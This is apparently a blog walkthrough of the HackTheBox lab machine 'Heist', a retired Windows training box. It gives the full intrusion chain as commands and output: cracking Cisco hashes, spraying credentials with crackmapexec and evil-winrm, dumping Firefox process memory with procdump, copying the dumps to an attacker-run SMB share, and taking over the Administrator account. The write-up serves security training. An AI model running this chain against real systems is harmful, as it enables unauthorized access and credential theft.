---
title: HTB | Heist
author: Zeropio
date: 2022-12-25
categories: [Pentesting, HackTheBox]
tags: [htb, windows, easy, machines]
permalink: /pentesting/htb/machines/heist
image:
  path: /assets/img/hackthebox/card/Heist.png
  width: 800
  height: 500
---

# Fingerprint

## Scan

The scan show:

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Support Login Page
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration

### HTTP

A login can be seen under the port 80:

![Untitled](/assets/img/hackthebox/labs/heist/Untitled.png)

Fuzzing the web show the following pages:

```
images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 54ms]
css                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 54ms]
js                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 58ms]
Images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 43ms]
attachments             [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 46ms]
CSS                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 80ms]
JS                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 61ms]
Js                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 43ms]
Css                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 44ms]
IMAGES                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 44ms]
                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
Attachments             [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 45ms]
                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 78ms]
jS                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 45ms]
                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 62ms]
```

We can login as **Guest**. There a conversation between a customer and an Admin can be seen. There it is talking about a **Cisco router** with the following configuration:

```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```

As it can be seen in the doc of Cisco, `username rout3r password 7 hidden_password`. 

---

# Footprint

## Initial Access

Trying to crack the Cisco hash report us:

```console
$ hashcat -m 500 hash /usr/share/wordlists/rockyou.txt

$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent              
                                                          
Session..........: hashcat
Status...........: Cracked
```

We can crack the **password 7** with some web. With that we get:

```
0242114B0E143F015F5D1E161713 -> $uperP@ssword
02375012182C1A1D751618034F36415408 -> Q4)sJu\Y8qz*A3?d
```

The second doesn’t seem to be a real password, but we have something. The login page ask for a email in the user field, so the previous users can’t be use.

Also, `evil-winrm` will not be useful:

```console
$ evil-winrm -i 10.10.10.149 -u rout3r -p stealth1agent
$ evil-winrm -i 10.10.10.149 -u rout3r -p '$uperP@ssword'
```

Some tries wouldn’t result:

```console
$ rpcclient -U rout3r 10.10.10.149                       
	Password for [WORKGROUP\rout3r]:
	Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

$ smbclient -L  \\\\10.10.10.149\\ -U rout3r
	Password for [WORKGROUP\rout3r]:
	session setup failed: NT_STATUS_LOGON_FAILURE
```

With the `stealth1agent` password we can list the smb:

```console
$ smbclient -L  \\\\10.10.10.149\\ -U Hazard                
Password for [WORKGROUP\Hazard]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.149 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

We can check the credentials are valid:

```console
$ crackmapexec smb 10.10.10.149 -u Hazard -p 'stealth1agent'
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent
```

We can try to bruteforcing the RID:

```console
$ crackmapexec smb 10.10.10.149 -u Hazard -p 'stealth1agent' --rid-brute
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      [+] Brute forcing RIDs
SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
```

Now we have a list of users and a list of password to use. We can search for the WinRM protocol:

```console
$ crackmapexec winrm 10.10.10.149 -u users -p pass

WINRM       10.10.10.149    5985   NONE             [-] None\Chase:$uperP@ssword
WINRM       10.10.10.149    5985   NONE             [+] None\Chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)
WINRM       10.10.10.149    5985   NONE             [-] None\Chase:Q4)sJu\Y8qz*A3?d "'NoneType' object has no attribute 'upper'"
WINRM       10.10.10.149    5985   NONE             [-] None\Jason:stealth1agent
```

Connect to the machine:

```console
$ evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'

*Evil-WinRM* PS C:\Users\Chase\Documents>
```

## Privilege Escalation

The user **Chase** doesn’t have access to much system commands. We can check their privileges:

```console
*Evil-WinRM* PS C:\Users\Chase\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Only the **Administrator** user is in the **administrators** group:

```console
*Evil-WinRM* PS C:\Users\Chase\Desktop> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
```

Dumping `lsass.exe` won’t be possible:

```console
*Evil-WinRM* PS C:\Users\Chase\Desktop> ./procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

Error opening lsass.exe (628):
Access is denied. (0x00000005, 5)
```

If we list for the process we can see that **firefox** is running:

```console
*Evil-WinRM* PS C:\Users\Chase\Desktop> get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    464      17     2056       5376               372   0 csrss
    291      13     2308       5280               484   1 csrss
    362      15     3548      14776              4536   1 ctfmon
    250      14     3928      13424              3536   0 dllhost
    166       9     1856       9736       0.03   4064   1 dllhost
    618      32    29368      57672               976   1 dwm
   1499      58    23692      79832              4764   1 explorer
    401      36    49192     108544       2.92   4092   1 firefox
    347      20    10216      35624       0.06   4808   1 firefox
   1068      75   181648     258844       8.56   5444   1 firefox
    378      29    29424      65740       0.88   6216   1 firefox
    355      25    16416      38856       0.58   6632   1 firefox
     49       6     1796       4712               752   1 fontdrvhost
     49       6     1496       3920               760   0 fontdrvhost
      0       0       56          8                 0   0 Idle
    967      23     5792      14996               628   0 lsass
    223      13     2976      10328              3840   0 msdtc
      0      12      348      15720                88   0 Registry
```

List all the firefox process:

```console
*Evil-WinRM* PS C:\Users\Chase\Desktop> get-process -name firefox

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    401      36    49196     352524       2.92   4092   1 firefox
    347      20    10216     288588       0.06   4808   1 firefox
   1092      76   181876     544200       8.56   5444   1 firefox
    378      29    29552     313972       0.88   6216   1 firefox
    355      25    16416     297452       0.58   6632   1 firefox
```

Now get the dmp of the all the process:

```console
*Evil-WinRM* PS C:\Users\Chase\Desktop> .\procdump.exe -ma 4092 firefox-1.dmp
*Evil-WinRM* PS C:\Users\Chase\Desktop> .\procdump.exe -ma 4808 firefox-2.dmp
...
```

Start a smb server in the attack host:

```console
$ sudo smbserver.py share -smb2support /tmp/ -user test -password pass
```

And upload the file:

```console
*Evil-WinRM* PS C:\Users\Chase\Desktop> net use n: \\10.10.14.4\share /user:test pass
*Evil-WinRM* PS C:\Users\Chase\Desktop> Out-File \\10.10.14.4\share\firefox-1.dmp
```

Grepping the files for `password` we found the following line:

```console
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ
```

We can try login with this credentials:

```console
$ crackmapexec winrm 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
SMB         10.10.10.149    5985   NONE             [*] None (name:10.10.10.149) (domain:None)
HTTP        10.10.10.149    5985   NONE             [*] http://10.10.10.149:5985/wsman
WINRM       10.10.10.149    5985   NONE             [+] None\Administrator:4dD!5}x/re8]FBuZ (Pwn3d!)

$ evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
